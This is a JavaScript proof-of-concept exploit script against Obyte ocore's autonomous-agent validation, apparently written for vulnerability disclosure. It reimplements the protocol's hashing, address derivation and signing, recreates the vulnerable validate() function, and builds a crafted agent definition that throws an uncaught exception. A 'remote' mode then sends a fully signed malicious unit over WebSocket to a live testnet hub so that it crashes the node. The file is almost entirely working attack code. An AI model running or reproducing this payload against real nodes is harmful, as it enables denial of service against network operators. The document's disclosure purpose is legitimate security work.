"use strict";

const crypto = require('crypto');
const _ = require('lodash');
const async = require('async');
const ecdsa = require('secp256k1');
const base32 = require('thirty-two');

/*
 * PoC: AA Validation Uncaught Exception (CVE pending)
 * Target: Obyte ocore aa_validation.js validate()
 *
 * Usage:
 *   node poc.js local              - Prove crash with real validate() logic
 *   node poc.js remote [hub_url]   - Send to testnet node
 */

const MODE = process.argv[2] || 'local';
const HUB = process.argv[3] || 'wss://obyte.org/bb-test';

// Malicious AA definition - triggers crash when validated
const MALICIOUS_DEF = ["autonomous agent", {
    bounce_fees: { base: 10000 },
    messages: [{ app: "data", payload: { x: { "if": "{1}" } } }]
}];


// ============ Protocol Implementation (from ocore) ============

// string_utils.js - canonical serialization
function getJsonSourceString(obj) {
    function s(v) {
        if (v === null) throw Error("null");
        switch (typeof v) {
            case "string": return JSON.stringify(v);
            case "number":
            case "boolean": return v.toString();
            case "object":
                if (Array.isArray(v)) return '[' + v.map(s).join(',') + ']';
                return '{' + Object.keys(v).sort().map(k => JSON.stringify(k) + ':' + s(v[k])).join(',') + '}';
        }
    }
    return s(obj);
}

function getSourceString(obj) {
    const c = [];
    function e(v) {
        if (v === null) throw Error("null");
        switch (typeof v) {
            case "string": c.push("s", v); break;
            case "number": c.push("n", v.toString()); break;
            case "boolean": c.push("b", v.toString()); break;
            case "object":
                if (Array.isArray(v)) { c.push('['); v.forEach(e); c.push(']'); }
                else { Object.keys(v).sort().forEach(k => { c.push(k); e(v[k]); }); }
                break;
        }
    }
    e(obj);
    return c.join("\x00");
}

// chash.js - address derivation
const offsets160 = (() => {
    const pi = "14159265358979323846264338327950288419716939937510".split("");
    const arr = []; let off = 0;
    for (let i = 0; off < 160; i++) {
        const r = parseInt(pi[i]); if (!r) continue;
        off += r; if (off >= 160) break; arr.push(off);
    }
    return arr;
})();

function buf2bin(buf) { return Array.from(buf, b => b.toString(2).padStart(8, '0')).join(''); }
function bin2buf(bin) { const b = Buffer.alloc(bin.length / 8); for (let i = 0; i < b.length; i++) b[i] = parseInt(bin.substr(i * 8, 8), 2); return b; }

function getChash160(data) {
    const hash = crypto.createHash("ripemd160").update(data, "utf8").digest().slice(4);
    const cs = crypto.createHash("sha256").update(hash).digest();
    const checksum = Buffer.from([cs[5], cs[13], cs[21], cs[29]]);
    const bd = buf2bin(hash), bc = buf2bin(checksum).split('');
    const frags = []; let start = 0;
    for (let i = 0; i < offsets160.length; i++) {
        frags.push(bd.substring(start, offsets160[i] - i), bc[i]);
        start = offsets160[i] - i;
    }
    if (start < bd.length) frags.push(bd.substring(start));
    return base32.encode(bin2buf(frags.join(''))).toString();
}

// object_hash.js
function objChash160(obj) {
    const src = (Array.isArray(obj) && obj.length === 2 && obj[0] === 'autonomous agent')
        ? getJsonSourceString(obj) : getSourceString(obj);
    return getChash160(src);
}

function b64Hash(obj, json) {
    const src = json ? getJsonSourceString(obj) : getSourceString(obj);
    return crypto.createHash("sha256").update(src, "utf8").digest("base64");
}

function getNaked(u) {
    const n = _.cloneDeep(u);
    ['unit', 'headers_commission', 'payload_commission', 'oversize_fee', 'actual_tps_fee', 'main_chain_index'].forEach(k => delete n[k]);
    if (n.messages) n.messages.forEach(m => { delete m.payload; delete m.payload_uri; });
    return n;
}

function getStripped(u) {
    const s = {
        content_hash: b64Hash(getNaked(u), true),
        version: u.version, alt: u.alt, timestamp: u.timestamp,
        authors: u.authors.map(a => ({ address: a.address }))
    };
    if (u.witness_list_unit) s.witness_list_unit = u.witness_list_unit;
    else if (u.witnesses) s.witnesses = u.witnesses;
    if (u.parent_units) {
        s.parent_units = u.parent_units;
        s.last_ball = u.last_ball;
        s.last_ball_unit = u.last_ball_unit;
    }
    return s;
}

function unitHash(u) { return b64Hash(getStripped(u), true); }

function hashToSign(u) {
    const n = getNaked(u);
    n.authors.forEach(a => delete a.authentifiers);
    return crypto.createHash("sha256").update(getJsonSourceString(n), "utf8").digest();
}

// object_length.js
function objLen(v, wk) {
    if (v === null) return 0;
    switch (typeof v) {
        case "string": return v.length;
        case "number": return 8;
        case "boolean": return 1;
        case "object":
            let n = 0;
            if (Array.isArray(v)) v.forEach(e => n += objLen(e, wk));
            else for (const k in v) { if (wk) n += k.length; n += objLen(v[k], wk); }
            return n;
    }
}

function headersSize(u) {
    const h = _.cloneDeep(u);
    ['unit', 'headers_commission', 'payload_commission', 'oversize_fee', 'actual_tps_fee', 'main_chain_index', 'messages', 'parent_units'].forEach(k => delete h[k]);
    return objLen(h, true) + 88 + 12;
}

function payloadSize(u) { return objLen({ messages: u.messages }, true); }

// Signing
function keygen() {
    let pk; do { pk = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(pk));
    return { priv: pk, pub64: Buffer.from(ecdsa.publicKeyCreate(pk)).toString('base64') };
}

function sign(u, pk) {
    return Buffer.from(ecdsa.ecdsaSign(hashToSign(u), pk).signature).toString('base64');
}


// ============ Vulnerable Code Recreation (from aa_validation.js) ============

function testLocal() {
    console.log('Executing vulnerable validate() from aa_validation.js\n');

    const isObj = o => typeof o === 'object' && !Array.isArray(o) && o !== null && Object.keys(o).length > 0;
    const getF = s => typeof s === 'string' && s.match(/^\{(.+)\}$/s) ? s.match(/^\{(.+)\}$/s)[1] : null;
    const hasC = v => typeof v === 'object' && v !== null && !Array.isArray(v) && Array.isArray(v.cases);
    const vf = (_, cb) => setImmediate(cb); // formula validator stub

    // Exact logic from aa_validation.js validate()
    function validate(obj, name, path, loc, depth, cb, vo) {
        if (depth > 100) return cb("max depth");
        loc = _.cloneDeep(loc);
        var val = obj[name];

        if (typeof name === 'string' && !vo) {
            if (getF(name) !== null)
                return vf({ f: getF(name) }, err => err ? cb(err) : validate(obj, name, path, loc, depth, cb, true));
        }

        if (typeof val === 'number' || typeof val === 'boolean') return cb();

        if (typeof val === 'string') {
            if (getF(val) === null) return cb();
            return vf({ f: getF(val) }, cb);
        }

        if (hasC(val)) {
            if (typeof name === 'string') path = path.substring(0, path.length - name.length - 1);
            return async.eachOfSeries(val.cases, (c, i, cb2) => {
                if (typeof c[name] === 'undefined') return cb2('no field ' + name);
                validate(val.cases, i, path, _.cloneDeep(loc), depth + 1, cb2);
            }, cb);
        }

        // VULNERABLE BRANCH
        if (typeof val === 'object' && (typeof val.if === 'string' || typeof val.init === 'string')) {
            const doIf = cb2 => typeof val.if !== 'string' ? cb2() : getF(val.if) === null ? cb2("not formula") : vf({}, cb2);
            const doInit = cb2 => typeof val.init !== 'string' ? cb2() : getF(val.init) === null ? cb2("not formula") : vf({}, cb2);
            return doIf(err => err ? cb(err) : doInit(err => {
                if (err) return cb(err);
                delete val.if;
                delete val.init;
                validate(obj, name, path, loc, depth, cb); // Re-enters with empty {}
            }));
        }

        if (Array.isArray(val))
            return async.eachOfSeries(val, (e, i, cb2) => validate(val, i, path, _.cloneDeep(loc), depth + 1, cb2), cb);

        if (isObj(val))
            return async.eachSeries(Object.keys(val), (k, cb2) => validate(val, k, path + '/' + k, _.cloneDeep(loc), depth + 1, cb2), cb);

        // CRASH POINT
        throw Error('unknown type of value in ' + name);
    }

    // Execute against malicious definition
    const def = _.cloneDeep(MALICIOUS_DEF);
    console.log('Definition: ' + JSON.stringify(def[1].messages[0].payload));

    process.once('uncaughtException', e => {
        console.log('\n[CRASH] ' + e.message);
        console.log('[RESULT] Node process terminated by uncaught exception');
        process.exit(0);
    });

    validate(def, 1, '', {}, 0, () => {
        console.log('[FAIL] Validation completed without crash');
        process.exit(1);
    });

    console.log('Async callback pending...');
}


// ============ Remote Attack (Real Testnet) ============

function testRemote(hub) {
    const WebSocket = require('ws');
    console.log('Target: ' + hub + '\n');

    const ws = new WebSocket(hub);
    const tags = {}; let tid = 0;

    function req(cmd, par) {
        return new Promise((res, rej) => {
            const t = 't' + (tid++);
            tags[t] = res;
            ws.send(JSON.stringify(['request', { command: cmd, params: par, tag: t }]));
            setTimeout(() => { if (tags[t]) { delete tags[t]; rej(Error('timeout: ' + cmd)); } }, 15000);
        });
    }

    ws.on('message', d => {
        let m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
        if (m[0] === 'response' && m[1] && tags[m[1].tag]) {
            tags[m[1].tag](m[1]);
            delete tags[m[1].tag];
        }
    });

    ws.on('error', e => { console.log('[ERROR] ' + e.message); process.exit(1); });

    ws.on('open', async () => {
        try {
            // Fetch network state
            const witnesses = (await req('get_witnesses')).response;
            if (!Array.isArray(witnesses)) throw Error('no witnesses');
            console.log('[+] Witnesses: ' + witnesses.length);

            const sp = (await req('get_last_stable_unit_props')).response;
            if (!sp || !sp.unit) throw Error('no stable unit');
            console.log('[+] Last stable: ' + sp.unit.substring(0, 20) + '...');

            const j = (await req('get_joint', sp.unit)).response;
            if (!j.joint || !j.joint.unit) throw Error('no joint');
            const ref = j.joint.unit;

            const parent = ref.unit;
            const ball = j.joint.ball || ref.last_ball;
            const ballUnit = j.joint.ball ? parent : ref.last_ball_unit;
            const ver = ref.version || '4.0t';
            const alt = ref.alt || '2';

            // Find witness_list_unit
            let wlu = ref.witness_list_unit;
            if (!wlu) {
                let search = ref.last_ball_unit;
                for (let i = 0; i < 5 && search && !wlu; i++) {
                    try {
                        const sj = (await req('get_joint', search)).response;
                        if (sj.joint && sj.joint.unit) {
                            wlu = sj.joint.unit.witness_list_unit;
                            if (!wlu) search = sj.joint.unit.last_ball_unit;
                        } else break;
                    } catch (e) { break; }
                }
            }

            // Build malicious unit
            const kp = keygen();
            const authDef = ["sig", { pubkey: kp.pub64 }];
            const authAddr = objChash160(authDef);
            const aaAddr = objChash160(MALICIOUS_DEF);
            const payload = { address: aaAddr, definition: MALICIOUS_DEF };

            const u = {
                version: ver, alt: alt,
                timestamp: Math.round(Date.now() / 1000),
                parent_units: [parent].sort(),
                last_ball: ball,
                last_ball_unit: ballUnit,
                authors: [{ address: authAddr, definition: authDef, authentifiers: {} }],
                messages: [{ app: 'definition', payload_hash: b64Hash(payload, true), payload: payload }]
            };

            if (wlu) u.witness_list_unit = wlu;
            else u.witnesses = witnesses;

            u.authors[0].authentifiers = { r: sign(u, kp.priv) };
            u.headers_commission = headersSize(u);
            u.payload_commission = payloadSize(u);
            u.unit = unitHash(u);

            console.log('[+] Unit hash: ' + u.unit);
            console.log('[+] AA address: ' + aaAddr);
            console.log('[*] Sending malicious joint...\n');

            ws.send(JSON.stringify(['justsaying', { subject: 'joint', body: { unit: u } }]));

            // Wait for response
            let done = false;
            ws.on('message', d => {
                if (done) return;
                let m; try { m = JSON.parse(d.toString()); } catch (e) { return; }
                if (m[0] === 'justsaying' && m[1] && ['error', 'result', 'info'].includes(m[1].subject)) {
                    done = true;
                    console.log('[RESPONSE] ' + m[1].subject + ': ' + JSON.stringify(m[1].body));
                }
            });

            setTimeout(() => {
                if (!done) console.log('[INFO] No response received (node may have crashed)');
                ws.close();
                process.exit(0);
            }, 10000);

        } catch (e) {
            console.log('[ERROR] ' + e.message);
            ws.close();
            process.exit(1);
        }
    });
}


// Entry
if (MODE === 'local') testLocal();
else if (MODE === 'remote') testRemote(HUB);
else console.log('Usage: node poc.js [local|remote] [hub_url]');
